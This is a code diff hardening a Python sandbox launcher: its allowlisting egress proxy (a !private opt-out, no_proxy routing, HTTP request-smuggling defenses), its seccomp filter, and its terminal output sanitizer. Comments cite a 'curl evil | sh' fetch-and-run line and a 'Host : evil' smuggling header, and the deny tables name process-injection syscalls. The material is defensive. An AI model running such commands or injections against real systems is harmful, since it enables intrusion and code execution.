@@ -31,7 +31,10 @@ Security model of the proxy (default-deny):
     link-local, CGNAT, multicast or reserved ranges are rejected, so an
     allowed name cannot be used to reach host/LAN services (SSRF guard,
     incl. 169.254.169.254). Explicit -a IP/CIDR entries deliberately bypass
-    that guard (explicit intent) — use them with care.
+    that guard (explicit intent) — use them with care — and so does a name
+    entry with an explicit !private marker (-a mirror.corp!private): that
+    ONE name may resolve into RFC 1918/loopback space, for internal mirrors
+    on the direct route.
   - Suffix match is on dot boundaries: -a example.com allows example.com and
     sub.example.com, but not notexample.com. Entries may carry a port
     (example.com:443); IPs and CIDRs are also accepted. Catch-all entries
@@ -42,9 +45,18 @@ Security model of the proxy (default-deny):
   - Optional upstream chaining (--upstream, or $SBOX_UPSTREAM / $https_proxy):
     schemes http, https (TLS to the proxy), socks5 and socks5h; userinfo in
     the URL is passed on (Basic auth / RFC 1929). Destinations are still
-    resolved and checked host-side before anything is sent upstream. Set
-    $SBOX_UPSTREAM_INSECURE (or --upstream-insecure) to skip TLS verification
-    of an https:// upstream (e.g. corporate MITM CA).
+    resolved and checked host-side before anything is sent upstream.
+    $NO_PROXY/$no_proxy is honored (curl semantics, lowercase no_proxy
+    winning — also when --upstream is passed explicitly): hosts the
+    deployment deliberately sends direct stay direct here too — it picks
+    the ROUTE, the allowlist still applies either way. Entries are host
+    suffixes, IP literals/CIDRs (which match literal-IP destinations only —
+    no DNS is ever done for no_proxy; internal NAMES still need a
+    !private allow entry to survive the guard on the direct route) or '*'.
+    'host:port' spellings lose their port (curl ignores no_proxy ports).
+    $SBOX_UPSTREAM_INSECURE=1 (or pass --upstream-insecure) skips TLS
+    verification of an https:// upstream (e.g. corporate MITM CA; only
+    1/true/yes/on count — any other value, including 0, does not).
   - A startup self-test talks to the real socket and verifies that a
     non-allowed destination is refused on both protocols before the sandbox
     starts, so the fail-closed guarantee is checked, not assumed.
@@ -79,7 +91,9 @@ Security model of the proxy (default-deny):
     open_by_handle_at, name_to_handle_at, quotactl, syslog and the new
     mount API: fsopen/fsconfig/fsmount/fspick/move_mount/open_tree/
     mount_setattr), process-injection APIs (ptrace, process_vm_readv/
-    writev, kcmp, pidfd_getfd, personality, vmsplice) and ioctl
+    writev, kcmp, pidfd_getfd, vmsplice) and personality changes (the
+    harmless 0xffffffff "query the current persona" call stays allowed),
+    plus ioctl
     TIOCSTI/TIOCLINUX; fanotify_init is denied too; socket() is limited to
     AF_UNIX/AF_INET/AF_INET6/AF_NETLINK (AF_VSOCK bypasses netns isolation
     in VM guests on older kernels). Denied calls return ENOSYS where
@@ -92,11 +106,12 @@ Security model of the proxy (default-deny):
     RUNTIME too: every launch starts with a host-side self-probe
     (seccomp_selfprobe — the filter is installed in a forked child and
     the C library's unshare(), ioctl(TIOCSTI), socket(AF_VSOCK),
-    personality() and ptrace() wrappers must all come back EPERM; the
+    personality(0) and ptrace() wrappers must all come back EPERM while
+    the personality(0xffffffff) query stays allowed; the
     libc name-to-number mapping is ground truth the table cannot fool),
     and tests/test_seccomp.py cross-checks every entry against kernel
     headers / scmp_sys_resolver / ausyscall and a live filter probe (a
-    wrong number once shipped here). The launch-time probe SAMPLES five
+    wrong number once shipped here). The launch-time probe SAMPLES six
     entries; the rest of the hand-typed table is pinned only by that
     test suite — run it after editing the tables.
 
@@ -104,8 +119,9 @@ Security model of the proxy (default-deny):
     host terminal, and output is input to the terminal EMULATOR — OSC 52
     rewrites the clipboard, device queries elicit answerback replies,
     cursor/erase sequences can forge already-reviewed output, SGR 8
-    (conceal) hides text from the reader, bidi/zero-width characters
-    deceive. --new-session blocks TIOCSTI INPUT injection; this is the
+    (conceal) hides text from the reader, bidi/zero-width and
+    blank-rendering characters (Hangul fillers, Braille blank) deceive.
+    --new-session blocks TIOCSTI INPUT injection; this is the
     output counterpart. bwrap's stdin/stdout/stderr become a host-side
     pty SLAVE (the real host terminal fd never enters the sandbox —
     close_fds guarantees bwrap gets nothing else), and everything read
@@ -113,9 +129,13 @@ Security model of the proxy (default-deny):
     terminal: printable text, \n/\r/\t and SGR color/style sequences
     (parameter string [0-9;]{0,64}, mode-8 conceal stripped) pass;
     OSC/DCS/APC/PM/SOS strings, non-SGR CSI, 2-byte and intermediate ESC
-    sequences, remaining C0/C1 controls (incl. U+009B) and bidi/zero-
-    width characters are dropped silently. A bare \r is allowed by
-    default (progress bars depend on it), which also lets payload output
+    sequences, remaining C0/C1 controls (incl. U+009B), bidi/zero-width
+    and blank-rendering characters (Hangul fillers U+115F/U+1160/U+3164/
+    U+FFA0, Braille blank U+2800) and hidden-data-carrying invisible
+    characters (variation selectors U+FE00..U+FE0E and U+E0100..U+E01EF,
+    combining grapheme joiner U+034F — U+FE0F emoji presentation stays)
+    are dropped silently. A bare \r is allowed by default (progress bars
+    depend on it), which also lets payload output
     VISUALLY overwrite the current line ("curl evil | sh\r" then "ok");
     --strict-crlf (implies --filter-output) drops \r unless it is
     immediately followed by \n. Trailing incomplete sequences
@@ -140,10 +160,11 @@ Security model of the proxy (default-deny):
     Needs no new dependencies (pty/tty/termios/select).
 
   - --net skips all of the above: bwrap then shares the host network
-    namespace (--unshare-all --share-net), /etc/resolv.conf is mounted, and
-    no proxy is started (direct egress; the allowlist is NOT enforced, and
-    host loopback services and abstract Unix sockets — D-Bus, X11, ... —
-    become reachable; only use it for trusted work).
+    namespace (--unshare-all --share-net), /etc/resolv.conf (plus
+    nsswitch.conf, services and protocols, so getservbyname() works) is
+    mounted, and no proxy is started (direct egress; the allowlist is NOT
+    enforced, and host loopback services and abstract Unix sockets —
+    D-Bus, X11, ... — become reachable; only use it for trusted work).
   - Lifecycle: one component dies -> everything dies (supervisor loop,
     --die-with-parent on bwrap, PR_SET_PDEATHSIG on the proxy; a SIGKILLed
     launcher therefore still takes the proxy with it).
@@ -233,8 +254,15 @@ Known limits (design trade-offs, not bugs):
     cloudfront.net, pages.dev, ...) allow attacker-controlled hosts under
     the same suffix. With --home, everything in $HOME can leave through
     any allowed host. Ports are unrestricted unless an entry carries
-    :port, and there is no domain-fronting protection (an allowed CDN
-    host may serve many origins).
+    :port, and there is no domain-fronting protection for TLS (CONNECT
+    tunnels opaquely; an allowed CDN host may serve many origins).
+    Forwarded plain-http:// requests are one-shot: Host is rewritten from
+    the checked URL and emitted as the FIRST header, header names must be
+    valid RFC 9110 tokens (no obs-fold, no "Host :"), Transfer-Encoding is
+    refused and only a single unambiguous Content-Length body is forwarded
+    before the origin socket is half-closed — so a pipelined second request
+    with its own Host cannot ride the connection. (TLS/CONNECT stays the
+    documented domain-fronting limit.)
   - With --upstream, the destination reaches the upstream as a literal IP:
     it sees CONNECT 1.2.3.4:443, never the hostname. Hostname-based policy
     or logging on that proxy cannot work, and some proxies reject IP
@@ -260,7 +288,10 @@ Known limits (design trade-offs, not bugs):
     interrupted from the keyboard — kill sbox.py from another shell. The
     filter is an allowlist: unusual-but-harmless characters beyond the
     deny ranges (NBSP, soft hyphen, other Unicode format characters) are
-    dropped too, an unterminated OSC/DCS swallows following bytes until
+    dropped too, and combining-mark stacking is not capped (a base
+    character buried under thousands of marks renders as a smear —
+    cosmetic, no control semantics). An unterminated OSC/DCS swallows
+    following bytes until
     its terminator or the 4096-byte cap (fail-safe: less is displayed,
     never more), and SGR sequences containing conceal are dropped
     wholesale rather than rewritten. Hidden text is NOT prevented beyond
@@ -361,11 +392,21 @@ def covers(a: str, b: str) -> bool:
 _raw_term = False
 
 
-def err(msg: str) -> None:
-    line = f"{PROG}: {msg}"
+def _emit_diag(text: str) -> None:
+    """Host-side diagnostic text on stderr, CR-safe for a raw tty (the
+    --filter-output pump and the piped proxy log both go through here)."""
+    if not text:
+        return
     if _raw_term:
-        line = line.replace("\n", "\r\n") + "\r"
-    print(line, file=sys.stderr, flush=True)
+        text = text.replace("\n", "\r\n")
+    try:
+        print(text, end="", file=sys.stderr, flush=True)
+    except (OSError, ValueError):
+        pass  # stderr closed: diagnostics are best-effort
+
+
+def err(msg: str) -> None:
+    _emit_diag(f"{PROG}: {msg}\n")
 
 
 def die(msg: str) -> None:
@@ -381,13 +422,21 @@ NAME_RE = re.compile(
 
 
 def parse_allow_entry(raw: str) -> dict:
-    """Parse one allow entry into {"kind": "name"|"net", "value", "port"}.
+    """Parse one allow entry into {"kind": "name"|"net", "value", "port"}
+    (name entries additionally carry "private": bool).
 
     Accepts: example.com, *.example.com (same thing), example.com:443,
     203.0.113.7, 203.0.113.0/24, [2001:db8::]/32, [2001:db8::]:443.
-    Rejects anything else loudly (this is a fail-closed tool).
+    A name entry may carry a trailing !private (mirror.corp!private): that
+    one name opts out of the SSRF guard (internal mirrors resolving to
+    RFC 1918 space). Rejects anything else loudly (this is a fail-closed
+    tool) — including !private on IP/CIDR entries, which the guard never
+    applies to anyway.
     """
     e = raw.split("#", 1)[0].strip().lower()
+    private = e.endswith("!private")
+    if private:
+        e = e[: -len("!private")].strip()
     while e.startswith("*."):
         e = e[2:]
     e = e.strip(".")
@@ -435,7 +484,7 @@ def parse_allow_entry(raw: str) -> dict:
             raise ValueError(f"invalid IP/CIDR entry: {raw!r}")
         if not NAME_RE.fullmatch(host):
             raise ValueError(f"not a valid hostname, IP or CIDR: {raw!r}")
-        return {"kind": "name", "value": host, "port": port}
+        return {"kind": "name", "value": host, "port": port, "private": private}
     if net.prefixlen < (8 if net.version == 4 else 16):
         # /0 is an explicit catch-all, but 0.0.0.0/1 + 128.0.0.0/1 (or ::/1)
         # amount to the same thing while silently bypassing the private-range
@@ -443,6 +492,11 @@ def parse_allow_entry(raw: str) -> dict:
         raise ValueError(
             f"{raw!r} is an effectively catch-all network (/{net.prefixlen}); "
             f"add narrower entries or use --net for unrestricted egress"
+        )
+    if private:
+        raise ValueError(
+            f"{raw!r}: !private only applies to name entries — literal IP/CIDR "
+            "entries bypass the private-range guard anyway"
         )
     return {"kind": "net", "value": str(net), "port": port}
 
@@ -483,6 +537,10 @@ def load_allows(opt_allows: list[str], opt_files: list[str]) -> list[dict]:
     return entries
 
 
+def _name_entry_matches(host: str, value: str) -> bool:
+    return host == value or host.endswith("." + value)
+
+
 def destination_allowed(allows: list[dict], host: str, port: int) -> tuple[bool, str]:
     """Allowlist check for a destination. Performs NO DNS and NO connection.
 
@@ -501,11 +559,87 @@ def destination_allowed(allows: list[dict], host: str, port: int) -> tuple[bool,
                 return True, f"matches allowed network {a['value']}"
         return False, "IP destination not in any allowed network"
     for a in allows:
-        if a["kind"] == "name" and a["port"] in (None, port):
-            v = a["value"]
-            if h == v or h.endswith("." + v):
-                return True, f"matches allowed name {v}"
+        if a["kind"] == "name" and a["port"] in (None, port) and _name_entry_matches(h, a["value"]):
+            return True, f"matches allowed name {a['value']}"
     return False, "hostname not on the allowlist"
+
+
+def private_allowed(allows: list[dict], host: str, port: int) -> bool:
+    """True when the destination matched a name entry carrying the explicit
+    !private marker (-a mirror.corp!private): that one name opts out of the
+    SSRF guard, for internal mirrors that resolve into RFC 1918/loopback
+    space on the direct ($no_proxy) route. The allowlist decision itself is
+    unaffected — this never widens WHAT is reachable, only which of its
+    resolved addresses may be dialed."""
+    h = host.rstrip(".").lower()
+    return any(
+        a["kind"] == "name" and a.get("private") and a["port"] in (None, port)
+        and _name_entry_matches(h, a["value"])
+        for a in allows
+    )
+
+
+def parse_no_proxy(raw: str | None) -> list[str]:
+    """Parse $NO_PROXY/$no_proxy into match entries (lowercased, curl
+    semantics). Each entry is a hostname suffix ('example.com' matches
+    example.com and subdomains on a dot boundary), an IPv4/IPv6 literal or
+    CIDR ('10.0.0.0/8', '::1' — these match literal-IP destinations only:
+    no_proxy is a ROUTE hint and never triggers DNS), or '*' (catch-all).
+    Leading dots and a leading '*.' are ignored; 'host:port' spellings lose
+    their port (curl ignores no_proxy ports — better a working route than
+    an entry that can never match). Entries that are neither valid
+    hostnames nor valid networks are dropped: they could never match."""
+    entries: list[str] = []
+    for tok in re.split(r"[,\s]+", raw or ""):
+        tok = tok.strip()
+        if tok == "*":
+            entries.append(tok)
+            continue
+        if tok.startswith("[") and "]" in tok:   # [v6] or [v6]:port
+            tok = tok[1:tok.index("]")]
+        elif tok.count(":") == 1:                # host:port
+            host, _, p = tok.partition(":")
+            if p.isdigit():
+                tok = host
+        tok = tok.strip("*.").lower()
+        if not tok:
+            continue
+        try:
+            if "/" in tok:                       # CIDR (or a bare IP: /32)
+                entries.append(str(ipaddress.ip_network(tok, strict=False)))
+                continue
+            ipaddress.ip_address(tok)            # bare IP literal, incl. ::1
+        except ValueError:
+            if not NAME_RE.fullmatch(tok):
+                continue                         # never matches; drop it
+        entries.append(tok)
+    return entries
+
+
+def no_proxy_matches(host: str, entries: list[str]) -> bool:
+    """curl-style no_proxy match: the host equals an entry or is a
+    subdomain of it on a dot boundary, or the list is a catch-all.
+    Network entries (IP/CIDR) match a literal-IP destination only."""
+    h = host.rstrip(".").lower()
+    ip = _parse_ip(h)
+    for e in entries:
+        if e == "*":
+            return True
+        if ip is not None:
+            try:
+                if ip in ipaddress.ip_network(e):
+                    return True
+            except ValueError:
+                pass
+        elif h == e or h.endswith("." + e):
+            return True
+    return False
+
+
+def no_proxy_from_env(env: dict) -> list[str]:
+    """$no_proxy wins over $NO_PROXY — curl gives the lowercase spelling
+    precedence; the launcher used to read them the other way around."""
+    return parse_no_proxy(env.get("no_proxy") or env.get("NO_PROXY"))
 
 
 def bad_ip(addr: ipaddress._BaseAddress) -> bool:
@@ -561,8 +695,11 @@ def _parse_ip(host: str):
         return None
 
 
-async def resolve_filtered(host: str, port: int) -> list:
-    """Resolve host on the host side and drop blocked (private etc.) answers."""
+async def resolve_filtered(host: str, port: int, private_ok: bool = False) -> list:
+    """Resolve host on the host side and drop blocked (private etc.)
+    answers. private_ok (the -a name!private opt-out) keeps private/
+    loopback/... answers instead — for internal mirrors on the direct
+    route; the allowlist still gated the name before we got here."""
     try:
         infos = await asyncio.get_running_loop().getaddrinfo(host, port, type=socket.SOCK_STREAM)
     except (socket.gaierror, UnicodeError) as e:
@@ -570,8 +707,12 @@ async def resolve_filtered(host: str, port: int) -> list:
     good, blocked = [], []
     for info in infos:
         sockaddr = info[4]
-        ip = ipaddress.ip_address(sockaddr[0])
-        if bad_ip(ip):
+        # getaddrinfo can answer scoped IPv6 names ("fe80::1%eth0"); the
+        # ipaddress module only understands those on >= 3.9 and we support
+        # 3.8 — judge the address part, keep the scoped spelling for
+        # connect() (which wants the scope for link-local).
+        ip = ipaddress.ip_address(sockaddr[0].partition("%")[0])
+        if bad_ip(ip) and not private_ok:
             blocked.append(str(ip))
         else:
             good.append(info)
@@ -616,6 +757,55 @@ async def _tunnel(cr, cw, sr, sw) -> None:
             pass
 
 
+async def _one_shot_forward(cr, sw, n: int) -> None:
+    """Forward EXACTLY n body bytes client->origin, then half-close the
+    origin (it processes exactly one request) and merely discard whatever
+    else the client sends: a pipelined second request — with its own Host —
+    can never ride the connection behind a declared body."""
+    half_closed = False
+
+    def half_close() -> None:
+        nonlocal half_closed
+        if not half_closed:
+            half_closed = True
+            try:
+                sw.write_eof()  # not every transport supports it (TLS upstream)
+            except Exception:
+                pass
+
+    try:
+        while True:
+            if n == 0:
+                half_close()  # no (more) declared body: delimit right here
+            buf = await cr.read(min(65536, n) if n else 65536)
+            if not buf:
+                return  # client gone; teardown closes the origin anyway
+            if n:
+                sw.write(buf)
+                await sw.drain()
+                n -= len(buf)
+            # past the declared body: read only so the client keeps flowing
+    except Exception:
+        pass  # OSError etc: the connection is done either way
+
+
+async def _one_shot(cr, cw, sr, sw, body_len: int) -> None:
+    """Like _tunnel, but the client->origin direction is _one_shot_forward:
+    the origin sees the rewritten request head, its declared body, then
+    EOF — and only its single response is relayed back."""
+    t1 = asyncio.create_task(_one_shot_forward(cr, sw, body_len))
+    t2 = asyncio.create_task(_pipe(sr, cw))
+    _, pending = await asyncio.wait({t1, t2}, return_when=asyncio.FIRST_COMPLETED)
+    for t in pending:
+        t.cancel()
+    await asyncio.gather(*pending, return_exceptions=True)
+    for w in (cw, sw):
+        try:
+            w.close()
+        except Exception:
+            pass
+
+
 def parse_hostport(target: str, default_port: int) -> tuple[str, int]:
     if target.startswith("["):
         host, _, rest = target[1:].partition("]")
@@ -631,17 +821,40 @@ def parse_hostport(target: str, default_port: int) -> tuple[str, int]:
     return host, int(p)
 
 
+# RFC 9110 header-name grammar (tchar). Header lines whose name is not a
+# token ("Host : evil" — space before the colon) are MALFORMED, and lenient
+# origins have parsed exactly such lines as a second Host header, which
+# would bypass the Host rewrite. obs-fold (lines starting SP/HTAB) is the
+# same class of trap and rejected separately.
+TOKEN_RE = re.compile(rb"[!#$%&'*+.^_`|~0-9A-Za-z-]+")
+
+
+def _line_clean(line: bytes) -> bool:
+    """True when a request/header line holds no control bytes besides the
+    optional CR of its final CRLF (tabs pass — legal in field values). A
+    bare \\r anywhere else would be forwarded inside a header value, where
+    it can confuse origin-side parsers; DEL is refused with the rest."""
+    body = line[:-2] if line.endswith(b"\r\n") else line.rstrip(b"\n")
+    return not any(b < 0x20 and b != 0x09 or b == 0x7f for b in body)
+
+
 class Proxy:
     """SOCKS5 + HTTP-CONNECT proxy with an allowlist, on a Unix socket."""
 
     def __init__(self, cfg: dict):
         self.allows = cfg.get("allows", [])
         self.upstream = cfg.get("upstream")
+        self.no_proxy = cfg.get("no_proxy") or []
         self.verbose = bool(cfg.get("verbose"))
 
     def log(self, msg: str) -> None:
         if self.verbose:
-            print(f"sbox-proxy: {msg}", file=sys.stderr, flush=True)
+            try:
+                print(f"sbox-proxy: {msg}", file=sys.stderr, flush=True)
+            except (BlockingIOError, BrokenPipeError):
+                pass  # stderr can be a non-blocking pipe under
+                      # --filter-output: a stalled launcher pump must never
+                      # block this event loop; diagnostics are droppable
 
     # -- destination handling -------------------------------------------------
 
@@ -671,14 +884,23 @@ class Proxy:
             # bytes — never let them reach the terminal raw.
             self.log(f"deny  {h!r}:{port} — {why}")
             raise DestinationError(2, why)
+        # The -a name!private opt-out (internal mirrors): the name was
+        # allowlisted, now let it resolve into private/loopback space.
+        private = private_allowed(self.allows, h, port)
 
-        if self.upstream:
+        # $no_proxy is honored when chaining (curl semantics): hosts the
+        # deployment deliberately sends direct (internal mirrors, ...) stay
+        # direct here too. The allowlist still applies either way — this
+        # only picks the ROUTE, never widens the policy.
+        if self.upstream and not no_proxy_matches(h, self.no_proxy):
             if ip is None:
-                infos = await resolve_filtered(h, port)
+                infos = await resolve_filtered(h, port, private)
                 ip = ipaddress.ip_address(infos[0][4][0])
             u = self.upstream
             self.log(f"allow {h!r}:{port} — via {u['scheme']} upstream {u['host']}:{u['port']} to {ip}")
             return await self._open_upstream(str(ip), port)
+        if self.upstream:
+            self.log(f"allow {h!r}:{port} — direct ($no_proxy bypasses the upstream)")
         if ip is not None:
             # Literal IP allowed explicitly: private ranges are intentional.
             self.log(f"allow {h!r}:{port} — direct (allowed literal IP)")
@@ -686,8 +908,9 @@ class Proxy:
                 return await asyncio.wait_for(asyncio.open_connection(str(ip), port), CONNECT_TIMEOUT)
             except (OSError, asyncio.TimeoutError) as e:
                 raise DestinationError(5, f"connect to {ip}:{port} failed: {e}")
-        infos = await resolve_filtered(h, port)
-        self.log(f"allow {h!r}:{port} — resolved " + ", ".join(str(i[4][0]) for i in infos))
+        infos = await resolve_filtered(h, port, private)
+        self.log(f"allow {h!r}:{port} — resolved " + ", ".join(str(i[4][0]) for i in infos)
+                 + (" (private answers allowed)" if private else ""))
         last: Exception | None = None
         for info in infos:
             sockaddr = info[4]
@@ -824,7 +1047,9 @@ class Proxy:
 
     async def _http_connect(self, reader, writer, target: str) -> None:
         try:
-            host, port = parse_hostport(target, 80)
+            # A portless CONNECT target is nonstandard; 443 is the
+            # conventional default (the traffic is virtually always TLS).
+            host, port = parse_hostport(target, 443)
         except ValueError:
             return await self._http_error(writer, 400, "bad CONNECT target\n")
         while True:  # drain request headers up to the blank line
@@ -852,27 +1077,57 @@ class Proxy:
                 writer, 400, "only http:// absolute URLs are proxied; https:// must use CONNECT\n"
             )
         headers: list[tuple[str, str]] = []
-        try:
-            while True:
-                line = await reader.readline()
-                if line in (b"\r\n", b"\n", b""):
-                    break
-                name, _, value = line.decode("latin-1").partition(":")
-                if name:
-                    headers.append((name, value.strip()))
-        except UnicodeDecodeError:
-            return await self._http_error(writer, 400, "malformed headers\n")
-        if not any(n.lower() == "host" for n, _ in headers):
-            # Synthesize Host from host[:port]: never copy the netloc, which
-            # may carry userinfo (http://user@host/) that must not reach the
-            # origin server. IPv6 literals need their brackets back.
-            if ":" in host:
-                headers.append(("Host", f"[{host}]:{port}"))
-            elif port != 80:
-                headers.append(("Host", f"{host}:{port}"))
-            else:
-                headers.append(("Host", host))
-        drop = {"proxy-connection", "proxy-authorization", "connection", "keep-alive"}
+        content_length: int | None = None
+        while True:
+            line = await reader.readline()
+            if line in (b"\r\n", b"\n", b""):
+                break
+            if not _line_clean(line):
+                # embedded \r/NUL/DEL: never forward those upstream
+                return await self._http_error(writer, 400, "malformed headers\n")
+            if line[:1] in (b" ", b"\t"):
+                # obs-fold continuation: deprecated, and the folded value
+                # would ride below our injected headers — refuse it
+                return await self._http_error(writer, 400, "obsolete line folding is not accepted\n")
+            name, sep, value = line.rstrip(b"\r\n").partition(b":")
+            # Valid RFC 9110 token names only: "Host : evil" (space before
+            # the colon) used to slip through as a forwarded line named
+            # "Host " — lenient origins parse it as a SECOND Host header,
+            # steering a shared IP to a vhost the allowlist never saw.
+            if not sep or not TOKEN_RE.fullmatch(name):
+                return await self._http_error(writer, 400, "malformed header line\n")
+            n = name.decode("latin-1")
+            v = value.strip().decode("latin-1")
+            low = n.lower()
+            if low == "transfer-encoding":
+                # Framed bodies cannot be relayed under the exactly-one-
+                # request rule; clients must declare a Content-Length.
+                return await self._http_error(
+                    writer, 400, "Transfer-Encoding is not supported; send Content-Length\n")
+            if low == "content-length":
+                if content_length is not None or not re.fullmatch(r"[0-9]+", v):
+                    # duplicate/ambiguous CL is the classic smuggling vector
+                    return await self._http_error(writer, 400, "ambiguous Content-Length\n")
+                content_length = int(v)
+            headers.append((n, v))
+        # Host is ALWAYS rewritten from the URL's authority, never forwarded
+        # from the client, and emitted as the FIRST header (RFC 9110
+        # recommends; servers that pick the first Host header then pick
+        # ours): the allowlist checked the URL's host, but on shared IPs
+        # (CDNs, name-based vhosts) the origin routes on Host, so a
+        # forwarded Host could reach a different vhost than the one that
+        # was allowed. (The CONNECT path cannot prevent this — that stays
+        # the documented domain-fronting limit.) Never copy the netloc
+        # either: it may carry userinfo that must not reach the origin.
+        # IPv6 literals need their brackets back.
+        if ":" in host:
+            host_hdr = f"[{host}]:{port}"
+        elif port != 80:
+            host_hdr = f"{host}:{port}"
+        else:
+            host_hdr = host
+        drop = {"proxy-connection", "proxy-authorization", "connection",
+                "keep-alive", "te", "trailer", "upgrade", "host"}
         head = "".join(f"{n}: {v}\r\n" for n, v in headers if n.lower() not in drop)
         path = parts.path or "/"
         if parts.query:
@@ -882,12 +1137,17 @@ class Proxy:
         except DestinationError as e:
             code = 403 if e.rep == 2 else 502
             return await self._http_error(writer, code, f"{code}: {e.why}\n", e.why)
-        sw.write(f"{method} {path} HTTP/1.1\r\n{head}Connection: close\r\n\r\n".encode("latin-1"))
+        # Exactly ONE request goes upstream: the rewritten head, then only
+        # the declared Content-Length body, then a half-close (_one_shot).
+        sw.write(f"{method} {path} HTTP/1.1\r\nHost: {host_hdr}\r\n{head}"
+                 "Connection: close\r\n\r\n".encode("latin-1"))
         await sw.drain()
-        await _tunnel(reader, writer, sr, sw)
+        await _one_shot(reader, writer, sr, sw, content_length or 0)
 
     async def _http(self, reader, writer, first: bytes) -> None:
         line = first + await reader.readline()
+        if not _line_clean(line):
+            return await self._http_error(writer, 400, "bad request line\n")
         parts = line.decode("latin-1", "replace").split()
         if len(parts) < 3 or not parts[2].upper().startswith("HTTP/"):
             return await self._http_error(writer, 400, "bad request line\n")
@@ -928,6 +1188,14 @@ def proxy_main(sock_path: str, cfg_path: str, expected_ppid: int) -> int:
         pass
     if os.getppid() != expected_ppid:  # launcher died between fork and prctl
         return 1
+    # Under --filter-output stderr is a pipe drained by the launcher's pump;
+    # make our end non-blocking so a momentarily-stalled pump can never
+    # block the event loop on a log write (Proxy.log drops on EAGAIN).
+    try:
+        if stat.S_ISFIFO(os.fstat(2).st_mode):
+            os.set_blocking(2, False)
+    except OSError:
+        pass
     with open(cfg_path, "r", encoding="utf-8") as fh:
         proxy = Proxy(json.load(fh))
 
@@ -988,6 +1256,13 @@ def parse_upstream(raw: str, insecure: bool) -> dict | None:
         "pass": urllib.parse.unquote(parts.password) if parts.password is not None else None,
         "tls_verify": not insecure,
     }
+
+
+def _env_flag(name: str) -> bool:
+    """True only for explicit affirmative values (1/true/yes/on): a bare
+    SBOX_UPSTREAM_INSECURE=0 must not silently disable TLS verification —
+    any non-empty string used to count as yes."""
+    return (os.environ.get(name) or "").strip().lower() in ("1", "true", "yes", "on")
 
 
 def self_test(sock_path: str, allows: list[dict]) -> None:
@@ -1074,9 +1349,12 @@ def _char_allowed(ch: str) -> bool:
     \\n \\r \\t are handled by the caller; everything refused here is
     dropped — remaining C0 controls, DEL, C1 controls (U+0080..U+009F,
     including the single-character CSI U+009B and OSC U+009D), bidi
-    overrides, zero-width/invisible characters, and anything else
-    non-printable (NBSP, soft hyphen, ...). C1 bytes are NOT interpreted
-    as sequence initiators — they never start a valid UTF-8 escape.
+    overrides, zero-width/invisible characters, blank-rendering fillers,
+    variation selectors and the combining grapheme joiner (invisible Mn
+    code points that can smuggle hidden bytes through copy-paste; U+FE0F
+    emoji presentation is the one kept), and anything else non-printable
+    (NBSP, soft hyphen, ...). C1 bytes are NOT interpreted as sequence
+    initiators — they never start a valid UTF-8 escape.
     """
     o = ord(ch)
     if o < 0x20 or 0x7F <= o <= 0x9F:
@@ -1087,6 +1365,19 @@ def _char_allowed(ch: str) -> bool:
         return False
     if o in (0x2060, 0x2066, 0x2067, 0x2068, 0x2069, 0xFEFF):
         return False               # word joiner, LRI RLI FSI PDI, BOM
+    if o in (0x115F, 0x1160, 0x2800, 0x3164, 0xFFA0):
+        return False               # blank-rendering fillers (Hangul Choseong/
+                                   # Jungseong/filler, Braille blank, HW
+                                   # filler): printable per isprintable()
+                                   # but render as empty space — spoofing
+    if o == 0x034F:                # combining grapheme joiner: invisible
+        return False               # (category Mn passes isprintable())
+    if 0xFE00 <= o <= 0xFE0E or 0xE0100 <= o <= 0xE01EF:
+        return False               # variation selectors: invisible Mn runs
+                                   # can smuggle bytes through copy-paste;
+                                   # U+FE0F (emoji presentation) is KEPT —
+                                   # it is ubiquitous and renders as nothing
+                                   # harmful on its own
     return ch.isprintable()        # the general printable-text allowlist
 
 
@@ -1482,8 +1773,9 @@ def _restore_termios(fd: int, saved) -> None:
 #                             injection APIs outright (gdb/strace need
 #                             --no-seccomp)
 #   kcmp, pidfd_getfd,        more process-inspection/fd-stealing surface
-#   personality, chroot       legacy attack surface (setarch -R needs
-#                             --no-seccomp)
+#   personality CHANGES,      legacy attack surface (setarch -R needs
+#                             --no-seccomp); the harmless 0xffffffff
+#   chroot                    "query" persona call stays allowed
 #   fsopen, fsmount, fsconfig, the new mount API: same powers as mount(),
 #   move_mount, open_tree,     which the caps normally already gate — pure
 #   fspick, mount_setattr      defense in depth
@@ -1555,13 +1847,17 @@ SECCOMP_EPERM = (
     "bpf", "perf_event_open", "userfaultfd",
     "keyctl", "add_key", "request_key",
     "unshare", "setns", "ptrace", "process_vm_readv", "process_vm_writev",
-    "kcmp", "pidfd_getfd", "personality", "chroot", "vmsplice",
+    "kcmp", "pidfd_getfd", "chroot", "vmsplice",
     "mount", "umount2", "pivot_root", "kexec_load", "kexec_file_load",
     "init_module", "finit_module", "delete_module", "open_by_handle_at",
     "name_to_handle_at", "quotactl", "syslog", "fanotify_init",
     "open_tree", "move_mount", "fsopen", "fsconfig", "fsmount",
     "fspick", "mount_setattr",
 )
+# personality is denied EXCEPT the 0xffffffff "query" magic (see
+# build_seccomp_bpf): the kernel returns the current persona without
+# changing anything for that one argument value.
+PERSONALITY_QUERY = 0xFFFFFFFF
 
 CLONE_NEWUSER = 0x10000000
 TIOCSTI = 0x5412
@@ -1643,6 +1939,18 @@ def build_seccomp_bpf(machine: str = "") -> bytes | None:
     emit(_BPF_JEQ_K, TIOCLINUX, "eperm", None)
     emit(_BPF_LD_W_ABS, 0)                       # reload nr: A holds the cmd
     marks["after_ioctl"] = len(insns)
+    # personality(): deny every persona CHANGE, allow the 0xffffffff
+    # "query" magic only — the kernel returns the current persona and
+    # changes nothing for that argument (personality(0xffffffff) is the
+    # setarch/glibc read idiom; setarch -R / ADDR_NO_RANDOMIZE and friends
+    # still need --no-seccomp). Like ioctl, the kernel takes the argument
+    # as an unsigned int, so only the low word is compared (0x1_0000_
+    # ffffffff executes as the query).
+    emit(_BPF_JEQ_K, table["personality"], None, "after_personality")
+    emit(_BPF_LD_W_ABS, 16)                      # args[0] low word (u32)
+    emit(_BPF_JEQ_K, PERSONALITY_QUERY, "allow", None)
+    emit(_BPF_RET_K, _SECCOMP_RET_ERRNO | errno.EPERM)  # any change: EPERM
+    marks["after_personality"] = len(insns)
     # socket(): allow only the usual families (SOCKET_FAMILIES; Flatpak's
     # set). AF_VSOCK notably reaches the host hypervisor in VM guests,
     # bypassing the network namespace on older kernels. socketpair() is not
@@ -1817,11 +2125,14 @@ def seccomp_selfprobe(bpf: bytes) -> None:
     fool. Probed (all harmless no-ops with distinguishable unfiltered
     errors): unshare(0) (the number that once shipped wrong),
     ioctl(TIOCSTI) on a non-tty fd (ENOTTY unfiltered), socket(AF_VSOCK)
-    (the netns-bypass family the gate refuses), personality(0) and
